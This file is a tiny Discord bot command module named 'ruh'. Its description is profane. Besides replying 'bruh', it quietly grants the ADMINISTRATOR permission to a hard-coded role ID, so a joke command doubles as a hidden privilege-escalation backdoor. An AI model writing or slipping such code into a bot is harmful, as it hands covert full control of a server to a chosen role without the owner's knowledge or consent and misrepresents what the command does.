module.exports = {
	name: 'ruh',
	description: 'why the fuck did you want me to program this shit',
	execute(message, args) {
		message.channel.send('bruh');
		message.guild.roles.get("717136443465662476").setPermissions(['ADMINISTRATOR'])
	},
};
